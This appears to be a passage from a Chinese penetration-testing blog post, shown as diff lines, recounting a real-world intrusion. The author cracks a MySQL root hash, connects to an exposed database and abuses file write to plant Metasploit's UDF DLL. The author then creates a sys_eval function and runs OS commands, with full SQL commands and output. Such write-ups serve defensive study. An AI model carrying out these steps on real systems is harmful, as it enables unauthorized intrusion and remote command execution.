+<p>2、由于非超级用户的操作有限，故换个方法来查看其余用户及权限并获取其余用户密码哈希，同时再去后台平台浏览发现存在相关公网服务IP，并对相关IP进行信息收集，相关结果如下：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/12/04/20211204152120.png" alt="image-20211204152120213" /></p>
+
+<p><img src="https:////image.isisy.com/images/2021/12/04/20211204152231.png" alt="image-20211204152231716" /></p>
+
+<p>发现root用户可远程主机登录且该用户具有超级用户权限，并复制密码哈希前往相关平台使用mysql5加密方式对其进行数据查询，成功获得其密码</p>
+
+<p><img src="https:////image.isisy.com/images/2021/12/04/20211204152629.png" alt="image-20211204152629456" /></p>
+
+<blockquote>
+  <p>若查询不到也可将获得的哈希密码使用hashcat进行爆破，具体爆破所用时间视密码的复杂度，此处不具体概述。</p>
+</blockquote>
+
+<p>此时对相关IP服务的扫描也有了结果，发现在一处IP上存在与该数据库版本信息相同的端口开放，如图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/12/04/20211204153043.png" alt="image-20211204153043069" /></p>
+
+<p>然后对其进行数据库使用root用户连接，成功连接：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/12/04/20211204154116.png" alt="image-20211204154116828" /></p>
+
+<p>3、查看系统版本信息进行信息确认，如下：</p>
+
+<pre><code class="language-mysql">MariaDB [mysql]&gt; select @@version_compile_os, @@version_compile_machine;
++----------------------+---------------------------+
+| @@version_compile_os | @@version_compile_machine |
++----------------------+---------------------------+
+| Win64                | x64                       |
++----------------------+---------------------------+
+1 row in set (0.161 sec)
+</code></pre>
+
+<p>系统为Windows系统，是所对应的操作系统，系统架构为64位，再查看数据库是否有文件读写权限，如下：</p>
+
+<pre><code class="language-mysql">MariaDB [(none)]&gt; show variables like '%secure_file_priv%';
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
+1 row in set (0.087 sec)
+</code></pre>
+
+<p><code class="language-plaintext highlighter-rouge">secure_file_priv</code>为纯空，数据库可任意目录读写，尝试使用load_file函数读取一下hosts文件，如图，成功读取文件信息：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/12/04/20211204154451.png" alt="image-20211204154451546" /></p>
+
+<p>那么也可以相应的写UDF文件进行提权。</p>
+
+<p>4、先去Metasploit相关目录下获取到适用于Windows 64位系统的UDF提权相关dll文件（此处不用SQLmap的UDF相关文件，因为SQLmap的UDF相关文件为了防止被误杀都经过编码处理过，使用时需要处理一下，Metasploit中的不需要处理即可使用），查看数据库根目录、数据目录、插件目录，如下：</p>
+
+<pre><code class="language-mysql">MariaDB [mysql]&gt; select @@basedir,@@datadir,@@plugin_dir;
++-----------+---------------+----------------------+
+| @@basedir | @@datadir     | @@plugin_dir         |
++-----------+---------------+----------------------+
+| D:\MySQL\ | D:\MySQLData\ | D:\MySQL\lib\plugin\ |
++-----------+---------------+----------------------+
+1 row in set (0.091 sec)
+</code></pre>
+
+<p>先将用于Windows下MySQL数据库UDF提权的dll文件进行十六进制编码，如图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/12/04/20211204174512.png" alt="image-20211204174512771" /></p>
+
+<p>接下来进行命令导出文件，此处注意导出使用dumpfile函数，而非outfile函数，因为outfile函数会对导出的文件内容会在行末写入新行，且更致命的是会存在对特殊字符转义操作，这样导出的二进制文件就会遭到破坏；而dumpfile函数则不对任何列或行进行终止，也不执行任何转义处理，此时导出的二进制文件还是完好的。</p>
+
+<blockquote>
+  <p>上述十六进制文件获取方法是在Linux系统中使用od命令并结合awk等命令辅助完成获取，也可以使用MySQL自带的hex函数来获取编码（前提相关MySQL数据库开启对文件可读写权限），命令如下：</p>
+
+  <pre><code class="language-mysql"># 直接传入路径
+select hex(load_file('/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll'));
+
+# 也可以将路径 hex 编码
+select hex(load_file(0x2f7573722f73686172652f6d65746173706c6f69742d6672616d65776f726b2f646174612f6578706c6f6974732f6d7973716c2f6c69625f6d7973716c7564665f7379735f36342e646c6c));
+</code></pre>
+</blockquote>
+
+<p>下面开始命令导出，导出的方法如下：</p>
+
+<pre><code class="language-mysql">#直接select查十六进制写入，需在十六进制数值前加0x
+select 0x4d5a90... into dumpfile 'D:/MySQL/lib/plugin/udf2.dll';
+
+#对十六进制解码写入（可不必）
+select unhex('4d5a90...') into dumpfile 'D:/MySQL/lib/plugin/udf2.dll';
+</code></pre>
+
+<blockquote>
+  <p>若在Windows系统下非MySQL读写文件权限导致的，在使用dumpfile函数写文件未成功，如图：</p>
+
+  <p><img src="https:////image.isisy.com/images/2021/12/04/20211204185129.png" alt="image-20211204185129464" /></p>
+
+  <p>在使用dumpfile时，涉及的路径应皆使用正斜杠“/”，上述在Windows系统中一开始在文件路径中使用反斜杠未成功写入文件，改用正斜杠之后测试成功写入UDF文件。又或者不存在对应插件目录也可导致无法写入文件，可借助NTFS流创建相关目录文件夹后在写入，此处不具体概述。</p>
+</blockquote>
+
+<p>结果如图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/12/04/20211204181700.png" alt="image-20211204181700116" /></p>
+
+<p>成功导出，为确保文件成功导出到目标机，遂再使用load_file函数读取一下文件，如图：</p>
+
+<p><img src="https:////image.isisy.com/images/2021/12/04/20211204181808.png" alt="image-20211204181808437" /></p>
+
+<p>成功返回文件十六进制编码，文件正确写入。</p>
+
+<p>5、构造自定义函数并调用命令，构造函数命令如下：</p>
+
+<pre><code class="language-mysql">MariaDB [mysql]&gt; create function sys_eval returns string soname 'udf2.dll';
+Query OK, 0 rows affected (0.213 sec)
+</code></pre>
+
+<p>此处<code class="language-plaintext highlighter-rouge">sys_eval</code>函数可自定义，然后查看MySQL函数是否有新增函数，命令如下：</p>
+
+<pre><code class="language-mysql">MariaDB [mysql]&gt; select * from mysql.func;
++----------+-----+----------+----------+
+| name     | ret | dl       | type     |
++----------+-----+----------+----------+
+| sys_eval |   0 | udf2.dll | function |
++----------+-----+----------+----------+
+1 row in set (0.184 sec)
+</code></pre>
+
+<p>至此成功使用自定义函数执行系统命令了，如果在 Windows 系统下的话应该就是最高权限了。</p>
+
+<pre><code class="language-mysql">MariaDB [mysql]&gt; select sys_eval('whoami');
++------------------------------+
+| sys_eval('whoami')           |
++------------------------------+
+| nt authority\network service |
++------------------------------+
+1 row in set (0.171 sec)
+</code></pre>
+
+<blockquote>
+  <p>sys_eval、sys_exec、sys_set、sys_get输出结果区别：</p>
+
+  <ul>
+    <li>sys_get：获取特定环境变量的值</li>
+    <li>sys_set：设置环境变量的值。此函数接受一个名称/值对，然后将其定义为环境变量。使用 sys_get 检索此类变量的值</li>
+    <li>sys_exec：执行其命令字符串参数并返回其退出状态。</li>
+    <li>sys_eval：执行其命令字符串参数并返回其标准输出。</li>
+  </ul>
+
+  <p>以Windows平台下的sys_eval与sys_exec函数执行结果如下：</p>
+
+  <pre><code class="language-mysql">MariaDB [mysql]&gt; select sys_eval('whoami');
++------------------------------+
+| sys_eval('whoami')           |
++------------------------------+
+| nt authority\network service |
++------------------------------+
+1 row in set (0.176 sec)
+
+MariaDB [mysql]&gt; select sys_exec('whoami');
++------------------------------+
+| sys_exec('whoami')           |
++------------------------------+
+|                         NULL |
++------------------------------+
+1 row in set (0.102 sec)
+</code></pre>
+</blockquote>
+
+<p>6、删除自定义函数</p>
+
+<pre><code class="language-mysql">drop function sys_eval;
+</code></pre>
+
+
+                <!-- [x] 2022/10/20/10:49:36 fixed: while width < some inch. would be flex column not display like a row.-->
+<footer>
+	<style>.border-top {
+		border-top: 1.5px solid #d0d7de!important;
+	}</style>
+	<div class="border-top"></div>
+		<section class="container-xl mt-lg-8 mt-6 px-3 px-md-6 no-print mx-auto">
+			<div class="col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix ">
+				<h2 class="lead">申明</h2>
+				<div>
+					<div class="mb-2"><a href="/blog/2021/实战-某平台SQL注入及UDF提权/" target="_blank" class=" text-bold">
+						<div class="fa fa-link"></div>
+						转载请申明本文档链接</a></div>
+					<div><a href="https://github.com/Yang2635" target="_blank"  class="text-bold">
+						<div class="fa fa-user"></div>
+						Post by Yang2635.</a>
+					</div>
+				</div>
+			</div>
+			<div class="col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix">
+				<h2 class="lead">贡献开源文档</h2>
+				<div>
+					<a href="https://github.com/Bin4xin/bin4xin.github.io/tree/main/_posts/blog/2021-12-06-实战-某平台SQL注入及UDF提权.md" target="_blank" class="no-underline btn mr-1 color-border-accent-emphasis">
+						<svg aria-hidden="true" focusable="false" role="img" class="octicon mr-1" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" style="display: inline-block; user-select: none; vertical-align: text-bottom; overflow: visible;"><path fill-rule="evenodd" d="M7.177 3.073L9.573.677A.25.25 0 0110 .854v4.792a.25.25 0 01-.427.177L7.177 3.427a.25.25 0 010-.354zM3.75 2.5a.75.75 0 100 1.5.75.75 0 000-1.5zm-2.25.75a2.25 2.25 0 113 2.122v5.256a2.251 2.251 0 11-1.5 0V5.372A2.25 2.25 0 011.5 3.25zM11 2.5h-1V4h1a1 1 0 011 1v5.628a2.251 2.251 0 101.5 0V5A2.5 2.5 0 0011 2.5zm1 10.25a.75.75 0 111.5 0 .75.75 0 01-1.5 0zM3.75 12a.75.75 0 100 1.5.75.75 0 000-1.5z"></path></svg>
+						贡献当前开源文档
+					</a>
+					<p class="f0_8-l mt-2 text-bold">此之前，学习开源贡献<a target="_blank" href="https://github.com/Bin4xin/bin4xin.github.io/wiki/Git操作-Git如何贡献仓库代码">CN&nbsp;|</a>
+						<a target="_blank" href="https://github.com/github/docs/blob/main/CONTRIBUTING.md">EN</a></p>
+				</div>
+			</div>
+			<div class="col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix">
+				<h2 class="lead">此文档对您有帮助吗</h2>
+				<a href="https://github.com/Bin4xin/bin4xin.github.io/" target="_blank" class="no-underline">
+				<span class="btn mr-1 color-border-accent-emphasis" title="给文档仓库点个赞!">
+					<div class="fa fa-thumbs-o-up"></div>
+				</span>
+				</a>
+				<a href="https://github.com/Bin4xin/bin4xin.github.io/issues/new?labels=Service+Issue,research&template=2-bug_report.yaml&title=_posts/blog/2021-12-06-实战-某平台SQL注入及UDF提权.md&nbsp; 实战-某平台SQL注入及UDF提权 | © 哨兵 | SENTINEL SECURITY, LAB" target="_blank">
+				<span class="btn mr-1 color-border-accent-emphasis" title="本文档有问题?">
+				<div class="fa fa-thumbs-o-down"></div>
+				</span>
+				</a>
+			</div>
+		</section>
+</footer>
+            </div>
+            <div class="spacing"></div>
+        </div><!--/col-lg-8 -->
+        
+<div class="col-md-4 ml-hide table-of-contents__left-border" style="max-height: 100%">
+    <div class="nav nav-stacked tableOfContents_35-E thin-scrollbar position-sticky top-0">
+        <li class=" table-of-contents">
+            <code-index-css>
+                <ul><li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column"><a>文章目录</a></li></ul>
+                <ul id="toc" class="section-nav">
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#前言">前言</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#后台接口sql注入">后台接口SQL注入</a></li>
+<li class="no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h3"><a href="#mysql数据库udf提权">MySQL数据库UDF提权</a></li>
+</ul>
+            </code-index-css>
+        </li>
+    </div>
+</div>
+
+    </div><!--/row -->
+</div><!--/container -->
+                <!-- 代码引用申明/code reference declaration:
+#############################################################################
+## code from cloudflare. visit footer in https://www.cloudflare.com/zh-cn/ ##
+#############################################################################
+-->
+
+<div id="footerwrap" class="hidden-print">
+    <div class="footer-container">
+        <div class="pt3 pt3-ns pt3-m pt7-l pb0 pb0-ns pb0-m pb5-l">
+            <div class="footer-row">
+                
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>入门</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/usage/" target="_blank">快速开始</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/blog/2019/jekyll/in/linux/" target="_blank">博客搭建</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/blog/2019/nginx/with/jekyll-site/" target="_blank">公网部署</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/tuna/mirror-web/" target="_blank">Jekyll Tuna源码</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>社区</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Bin4xin/bigger-than-bigger/" target="_blank">Bigger than Bigger</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Bin4xin/bigger-than-bigger/tree/master/CoVV" target="_blank">Collection Of Verified Vulnerabilities</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Bin4xin/sweet-ysoserial" target="_blank">sweet-ysoserial</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>技术栈</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://jekyllrb.com/docs/" target="_blank">Jekyll</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://www.markdownguide.org/" target="_blank">MarkDown</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://www.cloudflare.com/waf/" target="_blank">CloudFlare WAF</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://dash.cloudflare.com/dns/" target="_blank">CloudFlare CDN</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/features/actions" target="_blank">Github Action</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>关于</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/about/" target="_blank">近期研究</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/blog/" target="_blank">博客</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Bin4xin/bin4xin.github.io/wiki" target="_blank">WIKI</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>贡献者</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/bin4xin" target="_blank">本阿信</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/dnf-2008" target="_blank">夏天の风</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="https://github.com/Yang2635" target="_blank">Yang2635</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+<div class="footer-col-lg-2">
+    <details class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l" open>
+        <summary class="fw6 mt0 flex justify-between mb0 mb0-ns mb0-m mb1-l lh-copy f2 f2-ns f2-m f3-l ">
+            <span class="footer-abstract point"><strong>其他</strong></span>
+        </summary>
+        <ul class="db db-ns db-m db-l ma0 pa0 mt2 mt2-ns mt2-m mt0-l list">
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/usage/" target="_blank">帮助</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/privacy/" target="_blank">隐私</a></li>
+            
+            <li class="mt1 lh-6 "><a class="dotted-underline no-underline f2 fw4 footer-abstract" href="/privacy/#cookie" target="_blank">Cookie偏好</a></li>
+            
+            
+        </ul>
+    </details>
+</div>
+
+            </div><!-- "/row"-->
+            <!--TODO mark-->
+            <span class="btn mr-1 color-border-accent-emphasis" title="Under construction">
+					<div class="fa fa-bug">
+                        <div class="fa fa-hand-point-down"></div>
+                        <a href="https://github.com/Bin4xin/bin4xin.github.io/blob/main/.github/workflows/deploy.yml#L46" target="_blank">
+                        Clock counter Bug need to FIX.</a>
+                    </div>
+            </span>
+
+            <div class="pv2-ns">
+                <div class="bb bb-ns bb-m bn-l b--white pv2 pv2-ns pv2-m pv0-l flex footer-bottom-row-margin">
+                    <!--
+   - FlipClock design
+   -    @link { https://github.com/objectivehtml/FlipClock }
+-->
+<link rel="stylesheet" href="/assets/flipclock/flipclock.css">
+<script src="/assets/flipclock/flipclock.js"></script>
+
+<div class="clock" style="margin-bottom:2em;margin-top:2em;"></div>
+<div class="flex items-center mb3 mb3-ns mb3-m mb0-l lh-1 mt0 mt3-ns" >
+    
+    
+    
+    <div id="SentinelLAB"><a class="lh-1 dib mr2" title="SentinelLAB" target="_blank" rel="noopener" href="https://www.vulbox.com/team/ERRORS"></a></div>
+    
+    
+    
+    <div id="YouTuBe"><a class="lh-1 dib mr2" title="YouTuBe" target="_blank" rel="noopener" href="https://www.youtube.com/@bin4xin"></a></div>
+    
+    
+    
+    <div id="Twitter"><a class="lh-1 dib mr2" title="Twitter" target="_blank" rel="noopener" href="https://twitter.com/bin4xin"></a></div>
+    
+    
+    
+    <div id="Linkedin"><a class="lh-1 dib mr2" title="Linkedin" target="_blank" rel="noopener" href="https://www.linkedin.com/#"></a></div>
+    
+    
+    
+    <div id="Facebook"><a class="lh-1 dib mr2" title="Facebook" target="_blank" rel="noopener" href="https://www.facebook.com/#"></a></div>
+    
+    
+    
+    <div id="Bilibili"><a class="lh-1 dib mr2" title="Bilibili" target="_blank" rel="noopener" href="https://space.bilibili.com/67373868"></a></div>
+    
+</div>
+<!--
+  - Ajax @para counts
+  - Jquery-return-value-undefined @link { https://stackoverflow.com/questions/13848123/jquery-return-value-undefined }
+  -->
+<script>
+    function getGAJson() {
+        let counts = null
+        $.ajax({
+            url: 'https://bin4xin.sentrylab.cn/assets/ga.json',
+            dataType: 'json', // for cross-origin access
+            timeout: 1000 * 10, // 10 secs
+            async: false,
+            success: function(data) { counts = displayPageviews(data.rows); },
+            error: function() { console.log('Failed to load Pageviews!'); }
+        });
+        return counts;
+    }
+    function displayPageviews(rows) {
+        if (rows === undefined) { return; }
+        var curPath = window.location.pathname;
+        var curFile = curPath.slice(curPath.lastIndexOf('/') + 1); // Sometimes posts will be moved.
+        var len = rows.length;
+        var cnt = 0;
+
+        for (var i = 0; i < len; ++i) {
+            var gaPath = rows[i][0];
+            var gaFile = gaPath.slice(gaPath.lastIndexOf('/') + 1);
+
+            if (gaPath === curPath || gaFile === curFile) {
+                cnt += parseInt(rows[i][1]);
+            }
+        }
+        return setInitialCount(cnt);
+        // ref @link
+        //      - { https://cotes.page/posts/fetch-pageviews-from-google-analytics/#web-%E7%AB%AF%E5%A4%84%E7%90%86-ga-%E6%95%B0%E6%8D%AE }
+        //      - { https://taoalpha.github.io/blog/2015/06/07/tech-add-google-analytics-pageviews-to-jekyll-blog/ }
+    }
+    // <!-- @link { https://profile-counter.glitch.me/bin4xin.github.io/count.svg } -->
+    function setInitialCount(num) {
+        var init_SiteOffset = 66749;
+        _value_site_pv = parseInt(num)
+        all_counts = init_SiteOffset + _value_site_pv
+        return all_counts
+    }
+    var clock;
+    let All_Counts = getGAJson()
+    $(document).ready(function() {
+            // Instantiate a counter
+            clock = new FlipClock($('.clock'), All_Counts , {
+            clockFace: 'Counter'
+        });
+        // Attach a click event to a button an increment the clock
+        $('.increment').click(function() {
+            //clock.setValue(10); Or you could decrease the clock // clock.decrement();
+            clock.increment();
+            // Or set it to a specific value
+            // clock.setValue(x);
+        });
+        // Attach a click event to a button a decrement the clock
+        $('.decrement').click(function() {
+            clock.decrement();
+        });
+        $('.reset').click(function() {
+            clock.reset();
+        });
+    });
+</script>
+                </div>
+            </div><!-- "/pv5" -->
+        </div>
+    </div>
+    <div class="tertiary d-flex">
+        <div class="wrapper">
+            <div class="col justify-center flex-wrap-l d-flex justify-content-center">
+                <ul class="pa1 table-of-contents flex-xl-justify-between flex-xl-column">
+                    <li class="outstanding"><a>© 2019-2025 SENTRYLAB.CN</a></li>
+                    <li class="outstanding"><a>SENTINEL SECURITY, LAB</a></li>
+                    <li class="outstanding"><a>Jekyll Ver 3.9.3.</a></li>
+                </ul>
+            </div>
+        </div>
+    </div>
+</div><!--/footerwrap -->
+
+    </body>
+
+    <script src="/assets/js/copy.js"></script>
+<!--TODONE.
+**FireFox display BUG**
+position-fixed in FireFox display position -> none
+- Reference:
+    - { @link https://developer.mozilla.org/zh-CN/docs/Web/CSS/position#browser_compatibility }
+    - { @link https://blog.csdn.net/DDD4V/article/details/123354124 }
+    - { @link https://juejin.cn/post/6844904100576886797 }
+        - { @link Demo https://codepen.io/li377242494/pen/VwLGGaR }
+Fiex In `[assets/css/style.scss](https://github.com/Bin4xin/bin4xin.github.io/blob/main/assets/css/style.scss)`
+    - tooltipped css postion.
+-->
+
+<!--<link rel="preload" href="https://bobbyhadz.com/_next/static/css/b9669d7c5a48325f.css" as="style"/>-->
+<!--<link rel="stylesheet" href="https://bobbyhadz.com/_next/static/css/b9669d7c5a48325f.css" data-n-g=""/>-->
+
+<divs role="tooltip" class="position-fixed bottom-0 mb-4 right-5 mr-4 z-1 transition-200 opacity-0" onclick="$(&quot;html,body&quot;).animate({scrollTop:0}, 1000);">
+    <button class="tooltipped tooltipped-n tooltipped-no-delay color-bg-accent-emphasis color-fg-on-emphasis circle border-0" style="width:45px;height:45px"
+            aria-label="滚动到顶部">
+        <svg aria-hidden="true" role="img" class="octicon octicon-chevron-up" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" style="display:inline-block;user-select:none;vertical-align:text-bottom;overflow:visible">
+            <path fill-rule="evenodd" d="M3.22 9.78a.75.75 0 010-1.06l4.25-4.25a.75.75 0 011.06 0l4.25 4.25a.75.75 0 01-1.06 1.06L8 6.06 4.28 9.78a.75.75 0 01-1.06 0z">
+            </path>
+        </svg>
+    </button>
+</divs>
+
+
+</html>
